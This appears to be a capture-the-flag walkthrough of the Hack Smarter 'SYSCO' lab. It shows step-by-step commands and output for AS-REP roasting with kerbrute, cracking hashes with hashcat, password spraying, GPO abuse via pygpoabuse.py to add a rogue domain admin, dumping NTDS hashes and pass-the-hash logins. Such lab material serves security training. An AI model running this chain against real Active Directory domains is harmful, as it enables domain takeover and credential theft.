---
title: "Hack  Smarter  SYSCO  Lab"
date: 2025-10-31 00:00:00 +0800
categories: [Hack Smarter Lab]
tags: [username-anarchy, remmina, gpo-abuse, asreproasting, kerbrute, active-directory, privilege-escalation]
difficulty: medium
platform: Hack Smarter
image: /assets/img/posts/sysco-lab.png
excerpt: "A comprehensive walkthrough of the SYSCO lab on Hack Smarter, covering GPO abuse, ASREPRoasting, and privilege escalation techniques."
---

# SYSCO Lab Walkthrough

### Scenario
Sysco is a Managed Service Provider that has tasked you to perform an external penetration testing on their active directory domain. You must obtain initial foothold, move laterally and escalate privileges while evading Antivirus detection to obtain administrator privileges.

### Objectives and Scope
The core objective of this external penetration test is to simulate a realistic, determined adversary to achieve Domain Administrator privileges within Sysco's Active Directory (AD) environment. Starting from an external position, we will focus on obtaining an initial foothold, performing lateral movement, and executing privilege escalation while successfully evading Antivirus (AV) and other security controls. This is a red-team exercise to find security weaknesses before a real attacker does.

### Scanning
rustscan -a $target -- -A
```language
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-favicon: Unknown favicon MD5: DD229045B1B32B2F2407609235A23238
|_http-title: Index - Sysco MSP
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-10-30 14:49:34Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SYSCO.LOCAL
| Issuer: commonName=DC01.SYSCO.LOCAL
|   Target_Name: SYSCO
|   NetBIOS_Domain_Name: SYSCO
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SYSCO.LOCAL
|   DNS_Computer_Name: DC01.SYSCO.LOCAL
|   DNS_Tree_Name: SYSCO.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-30T14:50:44+00:00
```
### Http Enumeration Port 80
The website leaks the potential user worked in the Comapany so we use the tool called ***username-anarchy*** . This tool will help you get the combination of user list.
Save the usernames in the users.txt
```language
./username-anarchy -i users.txt  > valid-user.lst 
```

### Kerbrute
This tool will help us to find the valid user in the domain and also it will do a AS-Reproasting .
```language
kerbrute userenum -d SYSCO.LOCAL --dc $target valid-user.lst 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/31/25 - Ronnie Flathers @ropnop

2025/10/31 16:29:34 >  Using KDC(s):
2025/10/31 16:29:34 >   10.1.99.194:88

2025/10/31 16:29:34 >  [+] VALID USERNAME:       lainey.moore@SYSCO.LOCAL
2025/10/31 16:29:35 >  [+] jack.dowland has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$jack.dowland@SYSCO.LOCAL:fc0fa99a1a1e18d3c10f3a404d5217c7$f8a71edb135b8f43875b06923ff4c7166cf3b2d95ca7b7e781b275e076dc1541a0a1f1eeeb2302911b80f3b31bcd9e9ed5fcfaf98c31c64443bbfcc3f38521960d5ad30a5f5a69434dc63bdd0cbdf5baa12e11f07e88c52590b23e5ffe3ef3933d0c52469b5fcad47ef945c9b73ed39a5938d2e5a18852357e00efda6801677e4866027cf6ed0970f343a8cea5889fe7dc0c96f9d1cac0f1ad99cb603b84cd55ec30c68452c7ec76e625f52dc43a76e00f27013dbdbba3faad8746297edfa2c2de3da5191a782405b86d77a59e02582865cd3c0da4cc93ba6ac96f03eaaad1f191e7e8c305a794aeba7e793c09b8e91384e6f86e3ab71c1ccb4c49393b97                                                                                                                                                                                
2025/10/31 16:29:35 >  [+] VALID USERNAME:       jack.dowland@SYSCO.LOCAL
2025/10/31 16:29:35 >  [+] VALID USERNAME:       greg.shields@SYSCO.LOCAL
2025/10/31 16:29:40 >  Done! Tested 58 usernames (3 valid) in 6.422 seconds
```
### Crack the Hash Using hashcat
```language
$krb5asrep$18$jack.dowland@SYSCO.LOCAL:fc0fa99a1a1e18d3c10f3a404d5217c7$f8a71edb135b8f43875b06923ff4c7166cf3b2d95ca7b7e781b275e076dc1541a0a1f1eeeb2302911b80f3b31bcd9e9ed5fcfaf98c31c64443bbfcc3f38521960d5ad30a5f5a69434dc63bdd0cbdf5baa12e11f07e88c52590b23e5ffe3ef3933d0c52469b5fcad47ef945c9b73ed39a5938d2e5a18852357e00efda6801677e4866027cf6ed0970f343a8cea5889fe7dc0c96f9d1cac0f1ad99cb603b84cd55ec30c68452c7ec76e625f52dc43a76e00f27013dbdbba3faad8746297edfa2c2de3da5191a782405b86d77a59e02582865cd3c0da4cc93ba6ac96f03eaaad1f191e7e8c305a794aeba7e793c09b8e91384e6f86e3ab71c1ccb4c49393b97:musicman1
```
Validate the Creds
```language                                                                                                                                                                                             
┌──(root㉿kali)-[/home/ivy/Downloads/hack-smarter]
└─# NetExec smb $target -u jack.dowland -p 'musicman1' 
SMB         10.1.99.194     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.1.99.194     445    DC01             [+] SYSCO.LOCAL\jack.dowland:musicman1 
```
### Directory Fuzzing using Dirsearch
```lamguage
└─# dirsearch -u http://sysco.local -r -x 400,403
  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                   

Target: http://sysco.local/

[16:37:48] Starting:                                                                                                                                                                         
[16:38:48] 200 -    2KB - /assets/                                          
Added to the queue: assets/
[16:38:48] 301 -  335B  - /assets  ->  http://sysco.local/assets/           
[16:38:58] 200 -    2KB - /cgi-bin/printenv.pl                              
[16:39:14] 503 -  400B  - /examples                                         
[16:39:14] 503 -  400B  - /examples/                                        
[16:39:14] 503 -  400B  - /examples/jsp/index.html                          
[16:39:14] 503 -  400B  - /examples/servlet/SnoopServlet
[16:39:14] 503 -  400B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[16:39:14] 503 -  400B  - /examples/servlets/index.html
[16:39:14] 503 -  400B  - /examples/jsp/snp/snoop.jsp
[16:39:14] 503 -  400B  - /examples/servlets/servlet/CookieExample
[16:39:14] 503 -  400B  - /examples/websocket/index.xhtml                   
[16:39:14] 503 -  400B  - /examples/servlets/servlet/RequestHeaderExample
[16:39:16] 301 -  334B  - /forms  ->  http://sysco.local/forms/             
Added to the queue: forms/                                                  
[16:39:59] 200 -  219B  - /README.TXT                                       
[16:39:59] 200 -  219B  - /readme.txt                                       
[16:39:59] 200 -  219B  - /README.txt                                       
[16:39:59] 200 -  219B  - /ReadMe.txt                                       
[16:39:59] 200 -  219B  - /Readme.txt
[16:40:03] 200 -    5KB - /roundcube/index.php                            
```
---
image: /assets/img/posts/sysco-lab.png
---

### Download the config file
Crack the hash using the hashcat ---> Chocolate1
```language
cat router2.cfg 

version 15.1
no service timestamps log datetime msec
no service timestamps debug datetime msec
no service password-encryption
hostname R2
enable secret 5 $1$mERr$isugnYiHsjHT.i.tc2GDY.
<snip>
```
```language
hashcat -m 500 client.hash /usr/share/wordlists/rockyou.txt
```
```language
└─# NetExec smb $target -u lainey.moore -p 'Chocolate1'                                                  
SMB         10.1.99.194     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.1.99.194     445    DC01             [+] SYSCO.LOCAL\lainey.moore:Chocolate1 
```

### Analyzing Putty 
After run the putty we found the credentials in the target field. So we spray that password in the domain users . We get the successfull Hit.

# GPO Abuse 

### evil-winrm it
```language
evil-winrm -i $target -u 'greg.shields' -p'5y5coSmarter2025!!!'
```
### Grab the GPO id 
```language
# Grab the Domain admin GPO ID from there
Get-GPO -All
```
### pygpoabuse.py
By Default it create a user:- John  and Password:- H4x00r123..
```language
└─# python3 pygpoabuse.py sysco.local/greg.shields -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9'
Password:
success:root:The GPO already includes a ScheduledTasks.xml.
[+] The GPO heduledTasks.xml.
```
This tool will create a ScheduledTasks , that contain the user detail and add the user to the lcoal admin group .
```langauge
# Run this commands to make changes in the machine
gpudate /all

#check user know , john will add as a admin role in domain
net user john
```
### DCsync
So we are know the domain admin , we can dump every think. let's dump all user hashes.
```language
└─# NetExec smb 10.1.99.194 -u John -p 'H4x00r123..' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         10.1.99.194     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.1.99.194     445    DC01             [+] SYSCO.LOCAL\John:H4x00r123.. (Pwn3d!)
SMB         10.1.99.194     445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.1.99.194     445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:50cebf01ad04b46ba1b26d867537f56f:::
SMB         10.1.99.194     445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.99.194     445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:abfdb48ee56df1bae177c0f4dfc2c336:::
SMB         10.1.99.194     445    DC01             SYSCO.LOCAL\jack.dowland:1106:aad3b435b51404eeaad3b435b51404ee:91a8586ee7fa23961c7c1c5ed08285db:::
SMB         10.1.99.194     445    DC01             SYSCO.LOCAL\lainey.moore:1107:aad3b435b51404eeaad3b435b51404ee:082dd64e4b6fa39c4f831aca3c9afa2c:::
SMB         10.1.99.194     445    DC01             SYSCO.LOCAL\greg.shields:1108:aad3b435b51404eeaad3b435b51404ee:1523dc53f85642133dac0c25df4eceb9:::
SMB         10.1.99.194     445    DC01             john:3101:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
SMB         10.1.99.194     445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:515e04589a6dd8fd8270fb41830a77ae:::
```
## Root Flag
Grab the Root flag
```language
evil-winrm -i $target -u 'Administrator' -H $hash
```
